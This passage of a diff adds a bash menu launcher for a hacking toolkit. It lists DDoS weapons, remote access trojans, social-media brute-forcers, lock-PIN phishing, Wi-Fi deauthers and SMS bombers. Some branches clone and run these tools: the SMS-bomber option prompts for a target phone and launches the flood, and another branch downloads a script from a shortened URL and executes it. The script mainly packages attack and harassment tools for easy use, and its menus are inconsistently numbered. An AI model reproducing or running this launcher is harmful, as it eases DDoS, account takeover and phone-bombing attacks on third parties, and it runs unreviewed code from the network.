+cve_searchsploit
+press_enter
+cd ..
+exploit_framework_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+pip3 install cve_searchsploit
+python3 setup.py install
+cve_searchsploit
+press_enter
+cd ..
+exploit_framework_L
+else
+error_handle
+cd ..
+press_enter
+exploit_framework_L
+fi
+else
+exploit_framework_L
+fi
+else
+command_not_found
+fi
+}
+reverse_engineering_tools_L() {
+clear
+printf "\n\e[1;92mReverse engineering tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Androguard\n"
+printf "[\e[1;93m2\e[1;92m] Apk2Gold\n"
+printf "[\e[1;93m3\e[1;92m] JadX\n"
+printf "[\e[1;93m4\e[1;92m] Apktool\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+ddos_attack_tools_L() {
+clear
+printf "\n\e[1;92mDDOS Attack Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] aSYNcrone (Multifunction SYN Flood DDoS Weapon)\n"
+printf "[\e[1;93m2\e[1;92m] UFOnet\n"
+printf "[\e[1;93m3\e[1;92m] GoldenEye\n"
+printf "[\e[1;93m4\e[1;92m] CC-attack\n"
+printf "[\e[1;93m5\e[1;92m] DDos-Attack-OVH-\n"
+printf "[\e[1;93m6\e[1;92m] Raven-Strom\n"
+printf "[\e[1;93m7\e[1;92m] Overload-DoS\n"
+printf "[\e[1;93m8\e[1;92m] webdos-ddoser\n"
+printf "[\e[1;93m9\e[1;92m] pyDDoS\n"
+printf "[\e[1;93m10\e[1;92m] Bluebook\n"
+printf "[\e[1;93m11\e[1;92m] ddos-hammer\n"
+printf "[\e[1;93m12\e[1;92m] DDos-Scripts\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+remote_administrator_tools_L() {
+clear
+printf "\n\e[1;92mRemote Administrator Tools (RAT):\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Stitch\n"
+printf "[\e[1;93m2\e[1;92m] Pyshell\n"
+printf "[\e[1;93m3\e[1;92m] pupy\n"
+printf "[\e[1;93m4\e[1;92m] Stitch\n"
+printf "[\e[1;93m5\e[1;92m] EvilOSX\n"
+printf "[\e[1;93m6\e[1;92m] PowerShell-RAT\n"
+printf "[\e[1;93m7\e[1;92m] RAT-via-Telegram\n"
+printf "[\e[1;93m8\e[1;92m] Python-Rootkit\n"
+printf "[\e[1;93m9\e[1;92m] AndroRAT\n"
+printf "[\e[1;93m10\e[1;92m] poet\n"
+printf "[\e[1;93m11\e[1;92m] paradoxia\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+xss_attack_tools_L() {
+clear
+printf "\n\e[1;92mXSS Attack Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] DalFox(Finder of XSS)\n"
+printf "[\e[1;93m2\e[1;92m] XSS-LOADER\n"
+printf "[\e[1;93m3\e[1;92m] extended-xss-search (Extended XSS Searcher and Finder)\n"
+printf "[\e[1;93m4\e[1;92m] XSS-Freak\n"
+printf "[\e[1;93m5\e[1;92m] XSpear\n"
+printf "[\e[1;93m6\e[1;92m] XSSCon\n"
+printf "[\e[1;93m7\e[1;92m] XanXSS\n"
+printf "[\e[1;93m8\e[1;92m] XSStrike(Advanced XSS Detection Suite)\n"
+printf "[\e[1;93m9\e[1;92m] RVuln\n"
+printf "[\e[1;93m10\e[1;92m] ezXSS\n"
+printf "[\e[1;93m11\e[1;92m] xsser\n"
+printf "[\e[1;93m12\e[1;92m] Flag-Capture\n"
+printf "[\e[1;93m13\e[1;92m] XSS-Session-Hijacking-Simulator\n"
+printf "[\e[1;93m14\e[1;92m] PNSMN\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+steganograhy_tools_L() {
+clear
+printf "\n\e[1;92mSteganograhy tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] snow10 (Whitespace)\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+bruteforce_attacks_L() {
+clear
+printf "\n\e[1;92mBruteforce Attacks:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] instaBrute\n"
+printf "[\e[1;93m2\e[1;92m] instaShell\n"
+printf "[\e[1;93m3\e[1;92m] Brute_Force (AllinOne SocialMedia Attack)\n"
+printf "[\e[1;93m4\e[1;92m] underhanded (Application Checker)\n"
+printf "[\e[1;93m5\e[1;92m] pydictor\n"
+printf "[\e[1;93m6\e[1;92m] XBruteForcer\n"
+printf "[\e[1;93m7\e[1;92m] Faitagram\n"
+printf "[\e[1;93m8\e[1;92m] ighack\n"
+printf "[\e[1;93m9\e[1;92m] socialbrute\n"
+printf "[\e[1;93m10\e[1;92m] hasher\n"
+printf "[\e[1;93m11\e[1;92m] facebrute\n"
+printf "[\e[1;93m12\e[1;92m] dirsearch\n"
+printf "[\e[1;93m13\e[1;92m] Instagram (Brute Force Attack Tool for Instagram)\n"
+printf "[\e[1;93m14\e[1;92m] CMSeek\n"
+printf "[\e[1;93m15\e[1;92m] BruteX\n"
+printf "[\e[1;93m16\e[1;92m] Blazy\n"
+printf "[\e[1;93m17\e[1;92m] OpenDoor\n"
+printf "[\e[1;93m18\e[1;92m] BruteSploit\n"
+printf "[\e[1;93m19\e[1;92m] Plutus\n"
+printf "[\e[1;93m20\e[1;92m] Wifite2\n"
+printf "[\e[1;93m21\e[1;92m] BruteDum\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+android_hacking_tools_L() {
+clear
+printf "\n\e[1;92mAndroid Hacking tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Keydroid\n"
+printf "[\e[1;93m2\e[1;92m] MySMS\n"
+printf "[\e[1;93m3\e[1;92m] Lockphish (Grab target LOCK PIN)\n"
+printf "[\e[1;93m4\e[1;92m] WishFish {DroidCam (Capture Image)}\n"
+printf "[\e[1;93m5\e[1;92m] EvilApp (Hijack Session)\n"
+printf "[\e[1;93m6\e[1;92m] HatCloud(Bypass CloudFlare for IP)\n"
+printf "[\e[1;93m7\e[1;92m] PhoneSploit\n"
+printf "[\e[1;93m8\e[1;92m] Kali Nethunter(For Android)\n"
+printf "[\e[1;93m9\e[1;92m] Deskify(Install Linux Distributions in Android, For Temrux Only)\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 ]]; then
+show_linux_list
+elif [[ $input == 8 ]]; then
+clear
+printf "\nKali Nethunter (Rootless Edition):\n"
+sleep 0.2
+printf "Install Kali NetHunter on any stock, unrooted Android device without voiding the warranty.\n"
+printf "\nPrerequisite:\n"
+printf "{1} Android Device (Stock unmodified device, no root or custom recovery required)\n"
+printf "{2} VNC Viewer\n"
+printf "{3} Better Internet connection(Around 1.3GB rootfs file will be downloaded)\n"
+printf "{4} Hacker's Keyboard(Available on Play Store)\n"
+printf "{5} Around 9GB Internal Storage\n"
+printf "{6} Around 1.3GB of data will be used\n\n"
+printf "Do you want to download now?(y/n)"
+read -p $'\e[1;93m ' kali_install_permit
+if [[ $kali_install_permit == Y || $kali_install_permit == y ]]; then
+printf "\n\n\e[1;92mStarted setup ...\n"
+sleep 1
+if [ "$TERMUX" = true ]; then
+pkg install wget
+wget -O install-nethunter-termux https://offs.ec/2MceZWr
+chmod +x install-nethunter-termux
+./install-nethunter-termux
+elif [ "$LINUX" = true ]; then
+printf "\n\n\e[1;91mSorry, This installation is not possible in Linux!\n\e[1;92m"
+sleep 1
+read -p $'\e[1;92m\nPress ENTER to continue to Engine Ripper ... ' input_enter
+android_hacking_tools_L
+else
+error_handle
+fi
+printf "\n\n\e[1;92m"
+printf "For guide you can ask in Telegram Group: http://t.me/linux_repo \n"
+printf "\nDo you want to run kali nethunter now?"
+read -p $'(y/n) ' kali_run_permit
+if [[ $kali_run_permit == y || $kali_run_permit == Y ]]; then
+sleep 1
+printf "\n\e[1;92mRunning as root user!\n"
+nh -r
+else
+android_hacking_tools_L
+fi
+else
+android_hacking_tools_L
+fi
+elif [[ $input == 9 ]]; then
+printf "\n\nDownloading Deskify from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/Deskify
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd Deskify
+bash deskify.sh
+read -p $'\e[1;92m\nPress ENTER to continue to Engine Ripper ... ' input_enter
+cd ..
+android_hacking_tools_L
+else
+android_hacking_tools_L
+fi
+else
+command_not_found
+fi
+}
+idn_homograph_attack_L() {
+clear
+printf "\n\e[1;92mIDN Homograph Attack:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] EvilURL\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+email_verify_tools_L() {
+clear
+printf "\n\e[1;92mEmail Verify tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Knockmail\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+hash_cracking_tools_L() {
+clear
+printf "\n\e[1;92mHash cracking tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Hash-Buster\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+wifi_deauthenticate_L() {
+clear
+printf "\n\e[1;92mifi Deauthenticate:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] WifiJammer-NG\n"
+printf "[\e[1;93m2\e[1;92m] KawaiiDeauther\n"
+printf "[\e[1;93m3\e[1;92m] PixelDust\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+socialMedia_finder_L() {
+clear
+printf "\n\e[1;92mSocialMedia Finder:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] social_mapper (Find SocialMedia By Facial Recognation System)\n"
+printf "[\e[1;93m2\e[1;92m] finduser (Find SocialMedia By UserName)\n"
+printf "[\e[1;93m3\e[1;92m] socialscan (Username or Email)\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+payload_injector_L() {
+clear
+printf "\n\e[1;92mPayload Injector:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Debinject\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+web_crawling_L() {
+clear
+printf "\n\e[1;92mWeb crawling:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] Gospider\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+games_L() {
+clear
+printf "\n\e[1;92mGames:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] PySnakeGame\n"
+printf "[\e[1;93m2\e[1;92m] SpaceShooter\n"
+printf "[\e[1;93m3\e[1;92m] 2048\n"
+printf "[\e[1;93m4\e[1;92m] nsnake\n"
+printf "[\e[1;93m5\e[1;92m] FlappyBird\n"
+printf "[\e[1;93m6\e[1;92m] Tetris\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 ]]; then
+show_linux_list
+elif [[ $input == 1 ]]; then
+printf "\n\nDownloading PySnakeGame from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/PySnakeGame.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd PySnakeGame
+pip3 install -r requirments.txt
+python3 pysnakegame.py
+cd ..
+games_L
+else
+games_L
+fi
+elif [[ $input == 2 ]]; then
+printf "\n\nDownloading spaceshooter from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/spaceshooter.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd spaceshooter
+pip3 install -r requirments.txt
+python3 spaceshooter_rocky.py
+cd ..
+games_L
+else
+games_L
+fi
+elif [[ $input == 3 ]]; then
+printf "\n\nDownloading 2048 from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/2048.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd 2048
+if [ "$TERMUX" = true ]; then
+python3 2048-term.py
+elif [ "$LINUX" = true ]; then
+python3 2048.py
+else
+error_handle
+fi
+cd ..
+games_L
+else
+games_L
+fi
+elif [[ $input == 4 ]]; then
+printf "\n\nDownloading & Installing nsnake ...\n"
+sleep 1.8
+if [ "$TERMUX" = true ]; then
+pkg install nsnake -y
+printf "\n\nSetup complete!\n"
+do_you_want_to_open_tool
+elif [ "$LINUX" = true ]; then
+sudo apt install nsnake -y
+printf "\n\nSetup complete!\n"
+do_you_want_to_open_tool
+elif [ "$MAC" = true ]; then
+brew install nsnake
+printf "\n\nSetup complete!\n"
+do_you_want_to_open_tool
+else
+error_handle
+fi
+if [[ $input_open == y || $input_open == Y ]]; then
+printf "\n\e[0m"
+nsnake
+sleep 2
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+games_L
+else
+games_L
+fi
+elif [[ $input == 5 ]]; then
+printf "\n\nDownloading FlappyBird from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/FlappyBird.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd FlappyBird
+if [ "$TERMUX" = true ]; then
+printf "\n\n\e[1;91mCan't run in Termux!\e[1;92m\n"
+sleep 2
+cd ..
+games_L
+elif [ "$LINUX" = true ]; then
+pip3 install pygame pipenv
+pipenv install
+python3 flappy.py
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+cd ..
+games_L
+else
+error_handle
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+cd ..
+games_L
+fi
+else
+games_L
+fi
+elif [[ $input == 6 || $input == 06 ]]; then
+printf "Downloading Tetris from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/PyTetris
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd PyTetris
+if [ "$TERMUX" = true ]; then
+printf "\n\n\e[1;91mCan't run in Termux!\e[1;92m\n"
+sleep 2
+cd ..
+games_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+python3 -m pip install pygame
+python3 tetris.py
+press_enter
+cd ..
+games_L
+else
+error_handle
+cd ..
+fi
+else
+games_L
+fi
+else
+command_not_found
+fi
+}
+password_attacks_L() {
+clear
+printf "\e[1;92m\nPassword Attacking Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] john\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+messaging_tools_L() {
+clear
+printf "\e[1;92m\nMessaging Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] bomb3r\n"
+printf "[\e[1;93m2\e[1;92m] SmS-BomB\n"
+printf "[\e[1;93m3\e[1;92m] SpamSms\n"
+printf "[\e[1;93m4\e[1;92m] C-SpamMasal\n"
+printf "[\e[1;93m5\e[1;92m] TBomb\n"
+printf "[\e[1;93m6\e[1;92m] YetAnotherSMSBomber\n"
+printf "[\e[1;93m7\e[1;92m] ni_bomber\n"
+printf "[\e[1;93m00\e[1;92m] \n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+elif [[ $input == 1 ]]; then
+printf "Downloading bomb3r from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/iMro0t/bomb3r.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd bomb3r
+if [ "$TERMUX" = true ]; then
+pkg install python git wget curl -y
+pip3 install -r requirements.txt
+read -p $'\nTarget: ' user_input_target
+python3 bomber.py $user_input_target
+press_enter
+cd ..
+messaging_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip git wget curl -y
+pip3 install -r requirements.txt
+read -p $'\nTarget: ' user_input_target
+python3 bomber.py $user_input_target
+press_enter
+cd ..
+messaging_tools_L
+else
+error_handle
+cd ..
+press_enter
+messaging_tools_L
+fi
+else
+messaging_tools_L
+fi
+elif [[ $input == 2 ]]; then
+printf "Downloading SmS-BomB from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/Bhai4You/SmS-BomB.git
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd SmS-BomB
+if [ "$TERMUX" = true ]; then
+pkg install git wget curl -y
+chmod +x requirement.sh start.sh
+bash requirement.sh
+bash start.sh
+press_enter
+cd ..
+messaging_tools_L
+elif [ "$LINUX" = true ]; then
+sudo apt install git wget curl -y
+chmod +x requirement.sh start.sh
+bash requirement.sh
+bash start.sh
+press_enter
+cd ..
+messaging_tools_L
+else
+error_handle
+cd ..
+press_enter
+messaging_tools_L
+fi
+else
+messaging_tools_L
+fi
+else
+command_not_found
+fi
+}
+media_tools_L() {
+clear
+printf "\e[1;92m\nMedia Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] \n"
+printf "[\e[1;93m00\e[1;92m] \n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+networking_tools_L() {
+clear
+printf "\e[1;92mNetworking Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] \n"
+printf "[\e[1;93m00\e[1;92m] \n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+OS_tools_L() {
+clear
+printf "\e[1;92mOperating System Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] \n"
+printf "[\e[1;93m00\e[1;92m] \n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+Security_tools_L() {
+clear
+printf "\e[1;92mSecurity Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] \n"
+printf "[\e[1;93m00\e[1;92m] \n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+web_browser_tools_L() {
+clear
+printf "\e[1;92mWeb Browser Tools:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] \n"
+printf "[\e[1;93m00\e[1;92m] \n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+else
+command_not_found
+fi
+}
+TG_bots_source_codes_L() {
+clear
+printf "\e[1;92mTelegram Bots Source Codes:\n"
+sleep 0.2
+printf "[\e[1;93m1\e[1;92m] magneto-python-aria\n"
+printf "[\e[1;93m2\e[1;92m] Telegram-Leech-Bot\n"
+printf "[\e[1;93m00\e[1;92m] Back\n"
+inputs
+if [[ $input == 0 || $input == 00 ]]; then
+show_linux_list
+elif [[ $input == 1 ]]; then
+printf "Downloading magneto-python-aria from GitHub ...\n"
+sleep 1
+printf "Saving to "
+pwd
+printf "\n"
+sleep 0.5
+git clone https://github.com/AbirHasan2005/magneto-python-aria
+do_you_want_to_open_tool
+if [[ $input_open == y || $input_open == Y ]]; then
+cd magneto-python-aria
+if [ "$TERMUX" = true ]; then
+pkg install python git figlet -y
+pip3 install google-api-python-client google-auth-httplib2 google-auth-oauthlib
+pip3 install -r requirements.txt
+printf "\e[1;92m\n\nDownload complete!\n"
+printf "Now setup bot manually. Can't help you more."
+read -p $'\nDo you want to setup \e[1;96mTELEGRAPH_TOKEN\e[1;92m now?(N/y) ' setup_bot_permit
+if [[ $setup_bot_permit == y || $setup_bot_permit == Y ]]; then
+python3 generate_telegraph_token.py
+read -p $'\nDo you want to setup \e[1;96mUSER_SESSION_STRING\e[1;92m now?(N/y) ' setup_bot_permit2
+if [[ $setup_bot_permit2 == y || $setup_bot_permit2 == Y ]]; then
+python3 generate_string_session.py
+printf "\n\n\e[1;92mMy work done. Now setup other things by yourself.\n"
+else
+cd ..
+TG_bots_source_codes_L
+fi
+else
+cd ..
+TG_bots_source_codes_L
+fi
+elif [ "$LINUX" = true ]; then
+sudo apt install python3 python3-pip -y
+pip3 install google-api-python-client google-auth-httplib2 google-auth-oauthlib
+pip3 install -r requirements.txt
+printf "\e[1;92m\n\nDownload complete!\n"
+printf "Now setup bot manually. Can't help you more."
+read -p $'\nDo you want to setup \e[1;96mTELEGRAPH_TOKEN\e[1;92m now?(N/y) ' setup_bot_permit
+if [[ $setup_bot_permit == y || $setup_bot_permit == Y ]]; then
+python3 generate_telegraph_token.py
+read -p $'\nDo you want to setup \e[1;96mUSER_SESSION_STRING\e[1;92m now?(N/y) ' setup_bot_permit2
+if [[ $setup_bot_permit2 == y || $setup_bot_permit2 == Y ]]; then
+python3 generate_string_session.py
+printf "\n\n\e[1;92mMy work done. Now setup other things by yourself.\n"
+else
+cd ..
+TG_bots_source_codes_L
+fi
+else
+cd ..
+TG_bots_source_codes_L
+fi
+else
+error_handle
+cd ..
+fi
+else
+cd ..
+TG_bots_source_codes_L
+fi
+else
+command_not_found
+fi
+}
+press_enter() {
+printf "\n\n\e[1;92mPress ENTER to continue to Engine Ripper ..."
+read -p $'\e[1;96m ' enter_press
+}
+show_linux_list() {
+clear
+printf "\e[1;93m"
+printf "\n\nShowing Categories List ..."
+sleep 0.2
+printf "\n\n\e[1;92m"
+printf "     [\e[1;93m1\e[1;92m] Anonymously Hiding Tools\n"
+printf "     [\e[1;93m2\e[1;92m] Android Hacking tools\n"
+printf "     [\e[1;93m3\e[1;92m] Bruteforce Attacks\n"
+printf "     [\e[1;93m4\e[1;92m] DDOS Attack Tools\n"
+printf "     [\e[1;93m5\e[1;92m] Exploit framework\n"
+printf "     [\e[1;93m6\e[1;92m] Email Verify tools\n"
+printf "     [\e[1;93m7\e[1;92m] Forensic tools\n"
+printf "     [\e[1;93m8\e[1;92m] Hash cracking tools\n"
+printf "     [\e[1;93m2\e[1;92m] Information Gathering Tools\n"
+printf "     [\e[1;93m10\e[1;92m] Messaging Tools\n"
+printf "     [\e[1;93m11\e[1;92m] Media Tools\n"
+printf "     [\e[1;93m12\e[1;92m] Networking Tools\n"
+printf "     [\e[1;93m13\e[1;92m] Operating Systems Tools\n"
+printf "     [\e[1;93m14\e[1;92m] Security Tools\n"
+printf "     [\e[1;93m15\e[1;92m] Wordlist Generators\n"
+printf "     [\e[1;93m16\e[1;92m] Wireless attack tools\n"
+printf "     [\e[1;93m17\e[1;92m] SQL Injection Tools\n"
+printf "     [\e[1;93m18\e[1;92m] Phishing attack tools\n"
+printf "     [\e[1;93m19\e[1;92m] Web Attack Tools\n"
+printf "     [\e[1;93m20\e[1;92m] Web Browser Tools\n"
+printf "     [\e[1;93m99\e[1;92m] Show More Categories\n"
+printf "     [\e[1;93m00\e[1;92m] Back\n"
+inputs
+database1
+}
+show_linux_lists() {
+clear
+printf "\e[1;93m"
+printf "\n\nShowing Categories List ..."
+sleep 0.2
+printf "\n\n\e[1;92m"
+printf "     [\e[1;93m21\e[1;92m] Post exploitation tools\n"
+printf "     [\e[1;93m22\e[1;92m] Payload creation tools\n"
+printf "     [\e[1;93m23\e[1;92m] Reverse engineering tools\n"
+printf "     [\e[1;93m24\e[1;92m] Remote Administrator Tools(RAT)\n"
+printf "     [\e[1;93m25\e[1;92m] XSS Attack Tools\n"
+printf "     [\e[1;93m26\e[1;92m] Steganograhy tools\n"
+printf "     [\e[1;93m27\e[1;92m] IDN Homograph Attack\n"
+printf "     [\e[1;93m28\e[1;92m] Wifi Deauthenticate\n"
+printf "     [\e[1;93m29\e[1;92m] SocialMedia Finder\n"
+printf "     [\e[1;93m30\e[1;92m] Payload Injector\n"
+printf "     [\e[1;93m31\e[1;92m] Web crawling\n"
+printf "     [\e[1;93m32\e[1;92m] Password Attacking Tools\n"
+printf "     [\e[1;93m33\e[1;92m] Telegram Bots Source Codes\n"
+printf "     [\e[1;93m34\e[1;92m] Games Section\n"
+printf "     [\e[1;93m99\e[1;92m] Back to Previous Page\n"
+printf "     [\e[1;93m00\e[1;92m] Back to Main Menu\n"
+inputs
+database2
+}
+database1() {
+if [[ $input == 1 ]]; then
+anonymously_hiding_tools_L
+elif [[ $input == 2 ]]; then
+android_hacking_tools_L
+elif [[ $input == 3 ]]; then
+bruteforce_attacks_L
+elif [[ $input == 4 ]]; then
+ddos_attack_tools_L
+elif [[ $input == 5 ]]; then
+exploit_framework_L
+elif [[ $input == 6 ]]; then
+email_verify_tools_L
+elif [[ $input == 7 ]]; then
+forensic_tools_L
+elif [[ $input == 8 ]]; then
+hash_cracking_tools_L
+elif [[ $input == 9 ]]; then
+information_gathering_tools_L
+elif [[ $input == 10 ]]; then
+messaging_tools_L
+elif [[ $input == 11 ]]; then
+media_tools_L
+elif [[ $input == 12 ]]; then
+networking_tools_L
+elif [[ $input == 13 ]]; then
+OS_tools_L
+elif [[ $input == 14 ]]; then
+Security_tools_L
+elif [[ $input == 15 ]]; then
+wordlist_generators_L
+elif [[ $input == 16 ]]; then
+wireless_attack_tools_L
+elif [[ $input == 17 ]]; then
+sql_injection_tools_L
+elif [[ $input == 18 ]]; then
+phishing_attack_tools_L
+elif [[ $input == 19 ]]; then
+web_attack_tools_L
+elif [[ $input == 20 ]]; then
+web_browser_tools_L
+elif [[ $input == 99 ]]; then
+show_linux_lists
+elif [[ $input == 0 || $input == 00 ]]; then
+main_menu
+else
+command_not_found
+main_menu
+fi
+}
+database2() {
+if [[ $input == 21 ]]; then
+post_exploitation_tools_L
+elif [[ $input == 22 ]]; then
+payload_creation_tools_L
+elif [[ $input == 23 ]]; then
+reverse_engineering_tools_L
+elif [[ $input == 24 ]]; then
+remote_administrator_tools_L
+elif [[ $input == 25 ]]; then
+xss_attack_tools_L
+elif [[ $input == 26 ]]; then
+steganograhy_tools_L
+elif [[ $input == 27 ]]; then
+idn_homograph_attack_L
+elif [[ $input == 28 ]]; then
+wifi_deauthenticate_L
+elif [[ $input == 29 ]]; then
+socialMedia_finder_L
+elif [[ $input == 30 ]]; then
+payload_injector_L
+elif [[ $input == 31 ]]; then
+web_crawling_L
+elif [[ $input == 32 ]]; then
+password_attacks_L
+elif [[ $input == 34 ]]; then
+games_L
+elif [[ $input == 99 ]]; then
+show_linux_list
+elif [[ $input == 0 || $input == 00 ]]; then
+main_menu
+else
+command_not_found
+main_menu
+fi
+}
+loading() {
+clear
+printf "\e[1;92m"
+printf "\n▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+printf "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n"
+sleep 0.1
+clear
